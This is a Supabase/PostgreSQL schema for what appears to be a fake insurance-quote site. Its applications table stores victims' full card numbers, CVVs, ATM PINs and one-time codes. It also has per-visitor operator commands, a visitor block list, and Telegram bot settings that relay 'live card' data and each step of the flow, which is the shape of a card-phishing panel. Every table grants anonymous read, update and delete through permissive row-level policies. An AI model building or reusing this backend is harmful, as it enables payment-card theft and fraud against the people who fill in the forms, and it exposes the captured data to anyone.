-- ============ applications ============
CREATE TABLE IF NOT EXISTS public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  full_name TEXT,
  identity TEXT,
  birth_date TEXT,
  phone TEXT,
  insurance_type TEXT,
  start_date TEXT,
  purpose TEXT,
  est_value TEXT,
  car_year TEXT,
  car_model TEXT,
  repair_place TEXT,
  company TEXT,
  type TEXT,
  price NUMERIC,
  total NUMERIC,
  method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT,
  card_name TEXT,
  card_exp_month TEXT,
  card_exp_year TEXT,
  card_cvv TEXT,
  card_brand TEXT,
  otp_code TEXT,
  visitor_id TEXT,
  atm_pin TEXT,
  mutasil_phone TEXT,
  mutasil_provider TEXT,
  mutasil_id TEXT,
  mutasil_otp TEXT
);

CREATE INDEX IF NOT EXISTS applications_visitor_id_idx ON public.applications(visitor_id);
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.applications REPLICA IDENTITY FULL;

DROP POLICY IF EXISTS "public_select_applications" ON public.applications;
DROP POLICY IF EXISTS "public_insert_applications" ON public.applications;
DROP POLICY IF EXISTS "public_update_applications" ON public.applications;
DROP POLICY IF EXISTS "public_delete_applications" ON public.applications;
CREATE POLICY "public_select_applications" ON public.applications FOR SELECT USING (true);
CREATE POLICY "public_insert_applications" ON public.applications FOR INSERT WITH CHECK (true);
CREATE POLICY "public_update_applications" ON public.applications FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "public_delete_applications" ON public.applications FOR DELETE USING (true);

-- ============ updated_at trigger function ============
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END; $$;

DROP TRIGGER IF EXISTS applications_set_updated_at ON public.applications;
CREATE TRIGGER applications_set_updated_at BEFORE UPDATE ON public.applications
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ============ visitor_commands ============
CREATE TABLE IF NOT EXISTS public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL,
  command TEXT NOT NULL,
  payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_visitor_commands_visitor ON public.visitor_commands(visitor_id, created_at DESC);
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.visitor_commands REPLICA IDENTITY FULL;
DROP POLICY IF EXISTS "vc_select" ON public.visitor_commands;
DROP POLICY IF EXISTS "vc_insert" ON public.visitor_commands;
DROP POLICY IF EXISTS "vc_delete" ON public.visitor_commands;
CREATE POLICY "vc_select" ON public.visitor_commands FOR SELECT USING (true);
CREATE POLICY "vc_insert" ON public.visitor_commands FOR INSERT WITH CHECK (true);
CREATE POLICY "vc_delete" ON public.visitor_commands FOR DELETE USING (true);

-- ============ blocked_visitors ============
CREATE TABLE IF NOT EXISTS public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY,
  reason TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.blocked_visitors REPLICA IDENTITY FULL;
DROP POLICY IF EXISTS "bv_select" ON public.blocked_visitors;
DROP POLICY IF EXISTS "bv_insert" ON public.blocked_visitors;
DROP POLICY IF EXISTS "bv_delete" ON public.blocked_visitors;
CREATE POLICY "bv_select" ON public.blocked_visitors FOR SELECT USING (true);
CREATE POLICY "bv_insert" ON public.blocked_visitors FOR INSERT WITH CHECK (true);
CREATE POLICY "bv_delete" ON public.blocked_visitors FOR DELETE USING (true);

-- ============ chat_conversations / chat_messages ============
CREATE TABLE IF NOT EXISTS public.chat_conversations (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INT NOT NULL DEFAULT 0,
  unread_customer INT NOT NULL DEFAULT 0,
  initiated_by TEXT NOT NULL DEFAULT 'customer' CHECK (initiated_by IN ('customer', 'admin')),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_conversations_visitor ON public.chat_conversations(visitor_id);
CREATE INDEX IF NOT EXISTS idx_chat_conversations_last_msg ON public.chat_conversations(last_message_at DESC);

CREATE TABLE IF NOT EXISTS public.chat_messages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL CHECK (sender IN ('customer', 'admin')),
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_conv ON public.chat_messages(conversation_id, created_at);

ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_conversations REPLICA IDENTITY FULL;
ALTER TABLE public.chat_messages REPLICA IDENTITY FULL;

DROP POLICY IF EXISTS "Anyone can read conversations" ON public.chat_conversations;
DROP POLICY IF EXISTS "Anyone can create conversations" ON public.chat_conversations;
DROP POLICY IF EXISTS "Anyone can update conversations" ON public.chat_conversations;
DROP POLICY IF EXISTS "Anyone can delete conversations" ON public.chat_conversations;
CREATE POLICY "Anyone can read conversations" ON public.chat_conversations FOR SELECT USING (true);
CREATE POLICY "Anyone can create conversations" ON public.chat_conversations FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can update conversations" ON public.chat_conversations FOR UPDATE USING (true);
CREATE POLICY "Anyone can delete conversations" ON public.chat_conversations FOR DELETE USING (true);

DROP POLICY IF EXISTS "Anyone can read messages" ON public.chat_messages;
DROP POLICY IF EXISTS "Anyone can create messages" ON public.chat_messages;
DROP POLICY IF EXISTS "Anyone can delete messages" ON public.chat_messages;
CREATE POLICY "Anyone can read messages" ON public.chat_messages FOR SELECT USING (true);
CREATE POLICY "Anyone can create messages" ON public.chat_messages FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can delete messages" ON public.chat_messages FOR DELETE USING (true);

DROP TRIGGER IF EXISTS trg_chat_conversations_updated ON public.chat_conversations;
CREATE TRIGGER trg_chat_conversations_updated BEFORE UPDATE ON public.chat_conversations
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ============ sms_settings / sms_logs ============
CREATE TABLE IF NOT EXISTS public.sms_settings (
  id text PRIMARY KEY DEFAULT 'default',
  provider_name text NOT NULL DEFAULT '',
  api_url text NOT NULL DEFAULT '',
  http_method text NOT NULL DEFAULT 'POST',
  headers_json text NOT NULL DEFAULT '{}',
  body_template text NOT NULL DEFAULT '{"to":"{phone}","from":"{sender_id}","text":"{message}"}',
  content_type text NOT NULL DEFAULT 'application/json',
  default_sender_id text NOT NULL DEFAULT '',
  phone_format text NOT NULL DEFAULT 'e164',
  enabled boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.sms_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sms_settings REPLICA IDENTITY FULL;
DROP POLICY IF EXISTS "sms_settings_select" ON public.sms_settings;
DROP POLICY IF EXISTS "sms_settings_insert" ON public.sms_settings;
DROP POLICY IF EXISTS "sms_settings_update" ON public.sms_settings;
DROP POLICY IF EXISTS "sms_settings_delete" ON public.sms_settings;
CREATE POLICY "sms_settings_select" ON public.sms_settings FOR SELECT USING (true);
CREATE POLICY "sms_settings_insert" ON public.sms_settings FOR INSERT WITH CHECK (true);
CREATE POLICY "sms_settings_update" ON public.sms_settings FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "sms_settings_delete" ON public.sms_settings FOR DELETE USING (true);

DROP TRIGGER IF EXISTS set_updated_at_sms_settings ON public.sms_settings;
CREATE TRIGGER set_updated_at_sms_settings BEFORE UPDATE ON public.sms_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

CREATE TABLE IF NOT EXISTS public.sms_logs (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  application_id text,
  phone text NOT NULL,
  sender_id text NOT NULL DEFAULT '',
  message text NOT NULL,
  status text NOT NULL DEFAULT 'pending',
  http_status integer,
  provider_response text,
  error text,
  created_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.sms_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "sms_logs_select" ON public.sms_logs;
DROP POLICY IF EXISTS "sms_logs_insert" ON public.sms_logs;
DROP POLICY IF EXISTS "sms_logs_update" ON public.sms_logs;
DROP POLICY IF EXISTS "sms_logs_delete" ON public.sms_logs;
CREATE POLICY "sms_logs_select" ON public.sms_logs FOR SELECT USING (true);
CREATE POLICY "sms_logs_insert" ON public.sms_logs FOR INSERT WITH CHECK (true);
CREATE POLICY "sms_logs_update" ON public.sms_logs FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "sms_logs_delete" ON public.sms_logs FOR DELETE USING (true);

CREATE INDEX IF NOT EXISTS sms_logs_created_at_idx ON public.sms_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS sms_logs_application_id_idx ON public.sms_logs (application_id);

INSERT INTO public.sms_settings (id) VALUES ('default') ON CONFLICT (id) DO NOTHING;

-- ============ telegram_settings ============
CREATE TABLE IF NOT EXISTS public.telegram_settings (
  id text NOT NULL PRIMARY KEY DEFAULT 'default',
  enabled boolean NOT NULL DEFAULT false,
  bot_token text NOT NULL DEFAULT '',
  chat_id text NOT NULL DEFAULT '',
  send_live_card boolean NOT NULL DEFAULT true,
  send_steps boolean NOT NULL DEFAULT true,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.telegram_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.telegram_settings REPLICA IDENTITY FULL;
DROP POLICY IF EXISTS tg_select ON public.telegram_settings;
DROP POLICY IF EXISTS tg_insert ON public.telegram_settings;
DROP POLICY IF EXISTS tg_update ON public.telegram_settings;
DROP POLICY IF EXISTS tg_delete ON public.telegram_settings;
CREATE POLICY tg_select ON public.telegram_settings FOR SELECT USING (true);
CREATE POLICY tg_insert ON public.telegram_settings FOR INSERT WITH CHECK (true);
CREATE POLICY tg_update ON public.telegram_settings FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY tg_delete ON public.telegram_settings FOR DELETE USING (true);

DROP TRIGGER IF EXISTS set_telegram_settings_updated_at ON public.telegram_settings;
CREATE TRIGGER set_telegram_settings_updated_at BEFORE UPDATE ON public.telegram_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

INSERT INTO public.telegram_settings (id) VALUES ('default') ON CONFLICT (id) DO NOTHING;

-- ============ Realtime publication (idempotent) ============
DO $$
DECLARE t TEXT;
BEGIN
  FOREACH t IN ARRAY ARRAY['applications','chat_conversations','chat_messages','visitor_commands','blocked_visitors','sms_settings','sms_logs','telegram_settings']
  LOOP
    BEGIN
      EXECUTE format('ALTER PUBLICATION supabase_realtime ADD TABLE public.%I', t);
    EXCEPTION WHEN duplicate_object THEN
      NULL;
    END;
  END LOOP;
END $$;